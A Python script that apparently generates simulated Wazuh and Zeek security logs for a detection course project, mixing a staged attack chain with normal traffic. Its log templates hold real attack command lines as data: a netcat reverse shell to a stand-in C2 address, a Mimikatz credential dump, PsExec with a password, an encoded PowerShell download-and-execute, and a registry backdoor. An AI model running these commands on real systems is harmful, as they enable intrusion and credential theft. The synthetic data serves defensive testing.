"""
模拟日志生成器 - 定期向日志文件追加新数据
"""
import asyncio
import json
import random
from datetime import datetime, timezone
from pathlib import Path

# 日志文件路径（Linux部署用）
# WAZUH_LOG = "/home/Ariadne/data/logs/wazuh/archives.json"
# ZEEK_CONN_LOG = "/home/Ariadne/data/logs/zeek/conn.log"
# ZEEK_DNS_LOG = "/home/Ariadne/data/logs/zeek/dns.log"
# ZEEK_HTTP_LOG = "/home/Ariadne/data/logs/zeek/http.log"
# ZEEK_FILES_LOG = "/home/Ariadne/data/logs/zeek/files.log"

# 日志文件路径（Windows本地测试用）
WAZUH_LOG = "D:\\Projects\\Python\\Courses\\Ariadne\\data\\logs\\wazuh\\archives.json"
ZEEK_CONN_LOG = "D:\\Projects\\Python\\Courses\\Ariadne\\data\\logs\\zeek\\conn.log"
ZEEK_DNS_LOG = "D:\\Projects\\Python\\Courses\\Ariadne\\data\\logs\\zeek\\dns.log"
ZEEK_HTTP_LOG = "D:\\Projects\\Python\\Courses\\Ariadne\\data\\logs\\zeek\\http.log"
ZEEK_FILES_LOG = "D:\\Projects\\Python\\Courses\\Ariadne\\data\\logs\\zeek\\files.log"

# 攻击场景状态跟踪
attack_state = {
    "webshell_pid": 8888,
    "cmd_pid": 9001,
    "nc_pid": 9002,
    "mimikatz_pid": 9003,
    "psexec_pid": 9004,
    "powershell_pid": 9005,
    "scenario": 0  # 攻击场景计数器
}


def generate_wazuh_log():
    """生成 Wazuh 日志 - 模拟真实攻击链"""
    attack_state["scenario"] = (attack_state["scenario"] + 1) % 10
    
    # 攻击场景模板（按攻击链顺序）
    templates = [
        # 场景1: WebShell 初始入侵
        {
            "rule": {"level": 15, "description": "WebShell detected - suspicious web process spawning cmd", "id": "100101", "groups": ["webshell", "attack"]},
            "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"},
            "data": {"win": {"eventdata": {
                "image": "C:\\Windows\\System32\\cmd.exe",
                "processId": str(attack_state["cmd_pid"]),
                "parentProcessId": str(attack_state["webshell_pid"]),
                "parentImage": "C:\\inetpub\\wwwroot\\w3wp.exe",
                "commandLine": "cmd.exe /c whoami",
                "user": "NT AUTHORITY\\SYSTEM",
                "hashes": "SHA256=D9BE711BE2BF88096BB91C25DF775D90B964264AB25EC49CF04711D8C1F089F6"
            }, "system": {"eventID": "1", "computer": "WebServer-01"}}}
        },
        
        # 场景2: 反弹Shell
        {
            "rule": {"level": 15, "description": "Reverse shell detected - netcat execution", "id": "100102", "groups": ["reverse_shell", "c2", "attack"]},
            "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"},
            "data": {"win": {"eventdata": {
                "image": "C:\\Temp\\nc.exe",
                "processId": str(attack_state["nc_pid"]),
                "parentProcessId": str(attack_state["cmd_pid"]),
                "parentImage": "C:\\Windows\\System32\\cmd.exe",
                "commandLine": "nc.exe -e cmd.exe 45.67.89.123 4444",
                "user": "NT AUTHORITY\\SYSTEM",
                "hashes": "SHA256=E2A24AB94F865CAD87470B4583E59BAD6E3E49A8B34C6A420B9F368FA23E98E1"
            }, "system": {"eventID": "1", "computer": "WebServer-01"}}}
        },
        
        # 场景3: 凭据转储
        {
            "rule": {"level": 15, "description": "Mimikatz credential dumping detected", "id": "100103", "groups": ["credential_access", "mimikatz", "attack"]},
            "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"},
            "data": {"win": {"eventdata": {
                "image": "C:\\Temp\\mimikatz.exe",
                "processId": str(attack_state["mimikatz_pid"]),
                "parentProcessId": str(attack_state["nc_pid"]),
                "parentImage": "C:\\Temp\\nc.exe",
                "commandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
                "user": "NT AUTHORITY\\SYSTEM",
                "hashes": "SHA256=A1B2C3D4E5F6789012345678901234567890ABCDEF1234567890ABCDEF123456"
            }, "system": {"eventID": "1", "computer": "WebServer-01"}}}
        },
        
        # 场景4: 横向移动 - PsExec
        {
            "rule": {"level": 12, "description": "Lateral movement detected - PsExec", "id": "100104", "groups": ["lateral_movement", "remote_access", "attack"]},
            "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"},
            "data": {"win": {"eventdata": {
                "image": "C:\\Windows\\PsExec.exe",
                "processId": str(attack_state["psexec_pid"]),
                "parentProcessId": str(attack_state["cmd_pid"]),
                "parentImage": "C:\\Windows\\System32\\cmd.exe",
                "commandLine": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe",
                "user": "WebServer-01\\Administrator",
                "destinationIp": "192.168.1.101",
                "destinationPort": "445"
            }, "system": {"eventID": "1", "computer": "WebServer-01"}}}
        },
        
        # 场景5: PowerShell 恶意脚本
        {
            "rule": {"level": 12, "description": "PowerShell encoded command execution", "id": "100105", "groups": ["powershell", "execution", "attack"]},
            "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"},
            "data": {"win": {"eventdata": {
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "processId": str(attack_state["powershell_pid"]),
                "parentProcessId": str(attack_state["psexec_pid"]),
                "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
                "user": "victim-01\\admin"
            }, "system": {"eventID": "1", "computer": "victim-01"}}}
        },
        
        # 场景6: 文件完整性破坏 - 修改系统文件
        {
            "rule": {"level": 10, "description": "Critical system file modified", "id": "550", "groups": ["syscheck", "persistence", "file_integrity"]},
            "agent": {"id": "003", "name": "linux-server", "ip": "192.168.1.102"},
            "syscheck": {
                "path": "/etc/passwd",
                "event": "modified",
                "sha256_after": "abc123def456789modified",
                "md5_after": "def456789abc123",
                "size_after": 2048,
                "uname_after": "root",
                "perm_after": "rw-r--r--"
            }
        },
        
        # 场景7: 持久化 - 注册表启动项
        {
            "rule": {"level": 10, "description": "Registry Run key modified for persistence", "id": "100106", "groups": ["persistence", "registry", "attack"]},
            "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"},
            "data": {"win": {"eventdata": {
                "image": "C:\\Windows\\System32\\reg.exe",
                "processId": str(random.randint(9100, 9199)),
                "parentProcessId": str(attack_state["cmd_pid"]),
                "commandLine": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
                "user": "NT AUTHORITY\\SYSTEM"
            }, "system": {"eventID": "1", "computer": "WebServer-01"}}}
        },
        
        # 场景8: 网络连接 - C2 通信
        {
            "rule": {"level": 10, "description": "Suspicious network connection to known C2 server", "id": "100108", "groups": ["c2", "command_and_control", "network"]},
            "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"},
            "data": {"win": {"eventdata": {
                "image": "C:\\Temp\\nc.exe",
                "processId": str(attack_state["nc_pid"]),
                "sourceIp": "192.168.1.100",
                "sourcePort": str(random.randint(49152, 65535)),
                "destinationIp": "45.67.89.123",
                "destinationPort": "4444",
                "protocol": "tcp"
            }, "system": {"eventID": "3", "computer": "WebServer-01"}}}
        },
        
        # 场景9: 数据外泄准备
        {
            "rule": {"level": 8, "description": "Suspicious data compression activity", "id": "100109", "groups": ["collection", "exfiltration"]},
            "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"},
            "data": {"win": {"eventdata": {
                "image": "C:\\Windows\\System32\\tar.exe",
                "processId": str(random.randint(9200, 9299)),
                "parentProcessId": str(attack_state["powershell_pid"]),
                "commandLine": "tar.exe -czf C:\\Temp\\data.tar.gz C:\\Users\\*\\Documents",
                "user": "victim-01\\admin"
            }, "system": {"eventID": "1", "computer": "victim-01"}}}
        },
        
        # 场景10: 正常活动（混淆）
        {
            "rule": {"level": 3, "description": "Normal system activity", "id": "100110", "groups": ["normal"]},
            "agent": {"id": random.choice(["001", "002", "003"]), "name": random.choice(["WebServer-01", "victim-01", "linux-server"]), "ip": f"192.168.1.{random.randint(100, 102)}"},
            "data": {"win": {"eventdata": {
                "image": random.choice(["C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\explorer.exe", "C:\\Program Files\\Google\\Chrome\\chrome.exe"]),
                "processId": str(random.randint(1000, 8999)),
                "parentProcessId": str(random.randint(500, 999)),
                "commandLine": random.choice(["svchost.exe -k netsvcs", "explorer.exe", "chrome.exe"]),
                "user": "NT AUTHORITY\\SYSTEM"
            }, "system": {"eventID": "1", "computer": random.choice(["WebServer-01", "victim-01"])}}}
        }
    ]
    
    # 按场景顺序生成，但也有一定随机性
    if random.random() < 0.7:
        log = templates[attack_state["scenario"]].copy()
    else:
        log = random.choice(templates).copy()
    
    log["timestamp"] = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S+0000")
    return json.dumps(log, ensure_ascii=False)


def generate_zeek_conn():
    """生成 Zeek 连接日志 - 模拟攻击流量"""
    # 60% 概率生成攻击相关流量，40% 正常流量
    if random.random() < 0.6:
        # 攻击流量场景
        scenarios = [
            # C2 通信 - 长时间连接到可疑IP
            {
                "id.orig_h": "192.168.1.100",  # WebServer
                "id.orig_p": random.randint(49152, 65535),
                "id.resp_h": "45.67.89.123",  # C2 服务器
                "id.resp_p": 4444,
                "proto": "tcp",
                "conn_state": "SF",
                "duration": round(random.uniform(300.0, 3600.0), 2),  # 长时间连接
                "orig_bytes": random.randint(50000, 500000),  # 大量数据
                "resp_bytes": random.randint(100000, 1000000)
            },
            # 横向移动 - SMB 连接
            {
                "id.orig_h": "192.168.1.100",
                "id.orig_p": random.randint(49152, 65535),
                "id.resp_h": "192.168.1.101",  # 目标主机
                "id.resp_p": 445,  # SMB
                "proto": "tcp",
                "conn_state": "SF",
                "duration": round(random.uniform(5.0, 30.0), 2),
                "orig_bytes": random.randint(5000, 50000),
                "resp_bytes": random.randint(2000, 20000)
            },
            # 数据外泄 - 大量数据传输
            {
                "id.orig_h": "192.168.1.101",
                "id.orig_p": random.randint(49152, 65535),
                "id.resp_h": "45.67.89.123",
                "id.resp_p": 443,
                "proto": "tcp",
                "conn_state": "SF",
                "duration": round(random.uniform(60.0, 300.0), 2),
                "orig_bytes": random.randint(10485760, 52428800),  # 10MB-50MB
                "resp_bytes": random.randint(1000, 10000)
            },
            # SSH 暴力破解尝试
            {
                "id.orig_h": "45.67.89.123",
                "id.orig_p": random.randint(40000, 50000),
                "id.resp_h": "192.168.1.102",
                "id.resp_p": 22,
                "proto": "tcp",
                "conn_state": "REJ",  # 被拒绝
                "duration": 0.1,
                "orig_bytes": 100,
                "resp_bytes": 0
            }
        ]
        conn = random.choice(scenarios)
    else:
        # 正常流量
        conn = {
            "id.orig_h": f"192.168.1.{random.randint(100, 110)}",
            "id.orig_p": random.randint(49152, 65535),
            "id.resp_h": random.choice(["8.8.8.8", "1.1.1.1", "13.107.21.200", "172.217.0.46"]),
            "id.resp_p": random.choice([80, 443, 53]),
            "proto": random.choice(["tcp", "udp"]),
            "conn_state": "SF",
            "duration": round(random.uniform(0.1, 10.0), 2),
            "orig_bytes": random.randint(100, 5000),
            "resp_bytes": random.randint(500, 50000)
        }
    
    conn["ts"] = datetime.now(timezone.utc).timestamp()
    conn["uid"] = f"C{random.randint(100000, 999999)}"
    return json.dumps(conn)


def generate_zeek_dns():
    """生成 Zeek DNS 日志 - 包含 DNS 隧道和 DGA"""
    # 50% 概率生成可疑 DNS，50% 正常
    if random.random() < 0.5:
        # 可疑 DNS 场景
        scenarios = [
            # DNS 隧道 - 异常长的域名
            {
                "query": f"dGVzdGRhdGF0ZXN0ZGF0YXRlc3RkYXRhZGF0YXRlc3RkYXRh{random.randint(1000, 9999)}.evil-c2.com",
                "answers": ["45.67.89.123"]
            },
            # DGA 域名生成算法
            {
                "query": f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))}.net",
                "answers": ["1.2.3.4"]
            },
            # 已知恶意域名
            {
                "query": "c2server.badguys.net",
                "answers": ["45.67.89.123"]
            },
            # 可疑域名（typosquatting）
            {
                "query": random.choice(["g00gle.com", "micros0ft.com", "faceb00k.com"]),
                "answers": [f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"]
            }
        ]
        dns = random.choice(scenarios)
    else:
        # 正常 DNS 查询
        normal_domains = [
            "google.com",
            "microsoft.com",
            "github.com",
            "stackoverflow.com",
            "amazon.com",
            "cloudflare.com"
        ]
        dns = {
            "query": random.choice(normal_domains),
            "answers": [f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"]
        }
    
    return json.dumps({
        "ts": datetime.now(timezone.utc).timestamp(),
        "uid": f"D{random.randint(100000, 999999)}",
        "id.orig_h": f"192.168.1.{random.randint(100, 102)}",
        "id.orig_p": random.randint(49152, 65535),
        "id.resp_h": random.choice(["8.8.8.8", "1.1.1.1", "208.67.222.222"]),
        "id.resp_p": 53,
        "proto": "udp",
        "query": dns["query"],
        "qtype_name": "A",
        "answers": dns["answers"]
    })


def generate_zeek_http():
    """生成 Zeek HTTP 日志 - 包含恶意下载和 WebShell 通信"""
    # 50% 概率生成攻击相关流量
    if random.random() < 0.5:
        # 攻击场景
        scenarios = [
            # 恶意载荷下载
            {
                "id.orig_h": "192.168.1.101",
                "id.resp_h": "45.67.89.123",
                "method": "GET",
                "host": "malicious.com",
                "uri": random.choice(["/payload.exe", "/backdoor.dll", "/exploit.ps1", "/meterpreter.bin"]),
                "user_agent": "PowerShell",
                "status_code": 200
            },
            # WebShell 通信
            {
                "id.orig_h": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "id.resp_h": "192.168.1.100",  # WebServer
                "method": "POST",
                "host": "192.168.1.100",
                "uri": random.choice(["/shell.php", "/cmd.jsp", "/admin.aspx", "/upload.php"]),
                "user_agent": "curl/7.68.0",
                "status_code": 200
            },
            # 数据外泄
            {
                "id.orig_h": "192.168.1.101",
                "id.resp_h": "45.67.89.123",
                "method": "POST",
                "host": "45.67.89.123",
                "uri": "/upload",
                "user_agent": "python-requests/2.28.0",
                "status_code": 200
            },
            # C2 通信
            {
                "id.orig_h": "192.168.1.100",
                "id.resp_h": "45.67.89.123",
                "method": "POST",
                "host": "c2server.badguys.net",
                "uri": "/beacon",
                "user_agent": "Microsoft-CryptoAPI/10.0",
                "status_code": 200
            }
        ]
        http = random.choice(scenarios)
    else:
        # 正常 HTTP 流量
        http = {
            "id.orig_h": f"192.168.1.{random.randint(100, 110)}",
            "id.resp_h": random.choice(["93.184.216.34", "172.217.0.46", "13.107.21.200"]),
            "method": random.choice(["GET", "POST"]),
            "host": random.choice(["example.com", "microsoft.com", "github.com"]),
            "uri": random.choice(["/", "/index.html", "/api/status"]),
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "status_code": 200
        }
    
    return json.dumps({
        "ts": datetime.now(timezone.utc).timestamp(),
        "uid": f"H{random.randint(100000, 999999)}",
        "id.orig_h": http["id.orig_h"],
        "id.orig_p": random.randint(49152, 65535),
        "id.resp_h": http["id.resp_h"],
        "id.resp_p": random.choice([80, 443, 8080]),
        "proto": "tcp",
        "method": http["method"],
        "host": http["host"],
        "uri": http["uri"],
        "user_agent": http["user_agent"],
        "status_code": http["status_code"]
    })


def generate_zeek_files():
    """生成 Zeek 文件日志 - 包含恶意文件传输"""
    # 60% 概率生成可疑文件传输
    if random.random() < 0.6:
        # 恶意文件传输场景
        scenarios = [
            # 可执行文件下载（恶意载荷）
            {
                "id.orig_h": "192.168.1.101",
                "id.resp_h": "45.67.89.123",
                "id.resp_p": 80,
                "source": "HTTP",
                "mime_type": "application/x-dosexec",  # PE 文件
                "seen_bytes": random.randint(102400, 5242880),  # 100KB-5MB
                "total_bytes": random.randint(102400, 5242880)
            },
            # PowerShell 脚本下载
            {
                "id.orig_h": "192.168.1.100",
                "id.resp_h": "45.67.89.123",
                "id.resp_p": 443,
                "source": "HTTP",
                "mime_type": "text/plain",
                "seen_bytes": random.randint(10240, 102400),  # 10KB-100KB
                "total_bytes": random.randint(10240, 102400)
            },
            # 压缩文件（数据窃取）
            {
                "id.orig_h": "192.168.1.101",
                "id.resp_h": "45.67.89.123",
                "id.resp_p": 443,
                "source": "HTTP",
                "mime_type": "application/zip",
                "seen_bytes": random.randint(10485760, 104857600),  # 10MB-100MB（大文件）
                "total_bytes": random.randint(10485760, 104857600)
            },
            # 恶意文档（钓鱼）
            {
                "id.orig_h": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "id.resp_h": "192.168.1.100",
                "id.resp_p": 80,
                "source": "HTTP",
                "mime_type": random.choice(["application/pdf", "application/msword", "application/vnd.ms-excel"]),
                "seen_bytes": random.randint(204800, 2097152),  # 200KB-2MB
                "total_bytes": random.randint(204800, 2097152)
            }
        ]
        file_transfer = random.choice(scenarios)
    else:
        # 正常文件传输
        file_transfer = {
            "id.orig_h": f"192.168.1.{random.randint(100, 110)}",
            "id.resp_h": random.choice(["93.184.216.34", "172.217.0.46"]),
            "id.resp_p": random.choice([80, 443]),
            "source": "HTTP",
            "mime_type": random.choice(["text/html", "image/jpeg", "application/json", "text/css"]),
            "seen_bytes": random.randint(1024, 102400),
            "total_bytes": random.randint(1024, 102400)
        }
    
    return json.dumps({
        "ts": datetime.now(timezone.utc).timestamp(),
        "fuid": f"F{random.randint(100000, 999999)}",
        "uid": f"C{random.randint(100000, 999999)}",
        "id.orig_h": file_transfer["id.orig_h"],
        "id.orig_p": random.randint(49152, 65535),
        "id.resp_h": file_transfer["id.resp_h"],
        "id.resp_p": file_transfer["id.resp_p"],
        "source": file_transfer["source"],
        "depth": 0,
        "analyzers": [],
        "mime_type": file_transfer["mime_type"],
        "duration": round(random.uniform(0.1, 30.0), 2),
        "is_orig": False,
        "seen_bytes": file_transfer["seen_bytes"],
        "total_bytes": file_transfer["total_bytes"],
        "missing_bytes": 0,
        "overflow_bytes": 0,
        "timedout": False
    })


async def append_logs(interval: int = 3):
    """定期追加日志"""
    print("=" * 70)
    print("日志生成器已启动")
    print(f"每 {interval} 秒生成一批新日志")
    print("按 Ctrl+C 停止")
    print("=" * 70)
    
    count = 0
    
    try:
        while True:
            count += 1
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # 随机决定生成哪些类型的日志
            logs_generated = []
            
            # Wazuh (80% 概率)
            if random.random() < 0.8:
                with open(WAZUH_LOG, 'a', encoding='utf-8') as f:
                    f.write(generate_wazuh_log() + '\n')
                logs_generated.append("Wazuh")
            
            # Zeek Conn (90% 概率)
            if random.random() < 0.9:
                with open(ZEEK_CONN_LOG, 'a', encoding='utf-8') as f:
                    f.write(generate_zeek_conn() + '\n')
                logs_generated.append("Zeek-Conn")
            
            # Zeek DNS (70% 概率)
            if random.random() < 0.7:
                with open(ZEEK_DNS_LOG, 'a', encoding='utf-8') as f:
                    f.write(generate_zeek_dns() + '\n')
                logs_generated.append("Zeek-DNS")
            
            # Zeek HTTP (60% 概率)
            if random.random() < 0.6:
                with open(ZEEK_HTTP_LOG, 'a', encoding='utf-8') as f:
                    f.write(generate_zeek_http() + '\n')
                logs_generated.append("Zeek-HTTP")
            
            # Zeek Files (30% 概率)
            if random.random() < 0.3:
                with open(ZEEK_FILES_LOG, 'a', encoding='utf-8') as f:
                    f.write(generate_zeek_files() + '\n')
                logs_generated.append("Zeek-Files")
            
            print(f"[{timestamp}] 批次 {count}: 生成 {', '.join(logs_generated)}")
            
            await asyncio.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n" + "=" * 70)
        print(f"日志生成器已停止 (总共生成 {count} 批日志)")
        print("=" * 70)


if __name__ == "__main__":
    import sys
    
    # 获取间隔参数（默认3秒）
    interval = int(sys.argv[1]) if len(sys.argv) > 1 else 3
    
    asyncio.run(append_logs(interval))
